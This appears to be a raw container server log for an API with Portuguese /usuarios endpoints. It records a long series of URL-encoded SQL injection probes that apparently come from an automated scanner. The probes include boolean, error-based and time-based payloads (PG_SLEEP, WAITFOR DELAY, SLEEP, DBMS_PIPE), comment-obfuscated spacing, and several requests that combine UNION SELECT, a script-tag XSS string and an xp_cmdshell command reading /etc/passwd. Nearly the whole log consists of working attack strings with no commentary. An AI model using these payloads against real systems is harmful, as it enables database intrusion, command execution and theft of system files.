api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F4175%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28119%29%7C%7CCHR%28103%29%7C%7CCHR%28111%29%7C%7CCHR%2868%29%2C5%29--%2F%2A%2A%2FGpBy HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FAwzR HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FRDkz HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FIBhH HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FKDrq HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FqdRT HTTP/1.1
api-1  | 172.18.0.1 - POST /usuarios HTTP/1.1
api-1  | 172.18.0.1 - POST /usuarios?EgRz=1066%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - POST /usuarios HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/1 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/1 HTTP/1.1
api-1  | 172.18.0.1 - PUT /usuarios/1 HTTP/1.1
api-1  | 172.18.0.1 - PUT /usuarios/1?OPlp=9637%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - PUT /usuarios/1 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste&cZMW=4942%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=1599 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%28%22%29%28%29%28%29%2C%28%27 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27qtQRxF%3C%27%22%3Efjgtgc HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1967%3D8495%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27SRyK%27%3D%27SRyK HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7295%3D3557%2F%2A%2A%2FAND%2F%2A%2A%2F%27Qhes%27%3D%27Qhes HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1834%3D7629%2F%2A%2A%2FAND%2F%2A%2A%2F%283217%3D3217 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1600%3D2329 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7472%3D5848--%2F%2A%2A%2FWmtt HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282954%3D9120%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F9120%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F2344%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%288281%2CCONCAT%280x5c%2C0x716b6a7a71%2C%28SELECT%2F%2A%2A%2F%28ELT%288281%3D8281%2C1%29%29%29%2C0x716a6a7071%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27oDPc%27%3D%27oDPc HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%288281%2CCONCAT%280x5c%2C0x716b6a7a71%2C%28SELECT%2F%2A%2A%2F%28ELT%288281%3D8281%2C1%29%29%29%2C0x716a6a7071%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27Toht%27%3D%27Toht HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%288281%2CCONCAT%280x5c%2C0x716b6a7a71%2C%28SELECT%2F%2A%2A%2F%28ELT%288281%3D8281%2C1%29%29%29%2C0x716a6a7071%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284662%3D4662 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%288281%2CCONCAT%280x5c%2C0x716b6a7a71%2C%28SELECT%2F%2A%2A%2F%28ELT%288281%3D8281%2C1%29%29%29%2C0x716a6a7071%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%288281%2CCONCAT%280x5c%2C0x716b6a7a71%2C%28SELECT%2F%2A%2A%2F%28ELT%288281%3D8281%2C1%29%29%29%2C0x716a6a7071%29%29--%2F%2A%2A%2FqCpc HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5120%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285120%3D5120%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27Viqq%27%3D%27Viqq HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F5120%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285120%3D5120%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27vJRu%27%3D%27vJRu HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F5120%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285120%3D5120%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288756%3D8756 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5120%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285120%3D5120%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5120%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285120%3D5120%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FZPdC HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7071%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287071%3D7071%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27cZmn%27%3D%27cZmn HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7071%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287071%3D7071%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27KWaX%27%3D%27KWaX HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F7071%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287071%3D7071%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%283494%3D3494 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7071%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287071%3D7071%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7071%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287071%3D7071%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FWeNS HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9061%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289061%3D9061%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27gUcw%27%3D%27gUcw HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F9061%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289061%3D9061%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27InFw%27%3D%27InFw HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F9061%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289061%3D9061%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284163%3D4163 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9061%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289061%3D9061%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9061%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289061%3D9061%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FyGeX HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qkjzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285015%3D5015%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjjpq%27%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28122%29%7C%7CCHR%2883%29%7C%7CCHR%28105%29%7C%7CCHR%2880%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28122%29%7C%7CCHR%2883%29%7C%7CCHR%28105%29%7C%7CCHR%2880%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28122%29%7C%7CCHR%2883%29%7C%7CCHR%28105%29%7C%7CCHR%2880%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28122%29%7C%7CCHR%2883%29%7C%7CCHR%28105%29%7C%7CCHR%2880%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6804%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29BzSe%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27cFrK%27%3D%27cFrK HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6804%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29BzSe%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27qHDR%27%3D%27qHDR HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6804%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29BzSe%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285577%3D5577 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6804%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29BzSe%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6804%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29BzSe%29--%2F%2A%2A%2FFMAR HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F4175%3D%28SELECT%2F%2A%2A%2F4175%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27vGNM%27%3D%27vGNM HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F4175%3D%28SELECT%2F%2A%2A%2F4175%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27SkCH%27%3D%27SkCH HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F4175%3D%28SELECT%2F%2A%2A%2F4175%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289573%3D9573 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4175%3D%28SELECT%2F%2A%2A%2F4175%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4175%3D%28SELECT%2F%2A%2A%2F4175%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FZsbQ HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27vnbL%27%3D%27vnbL HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27Crmm%27%3D%27Crmm HTTP/1.1
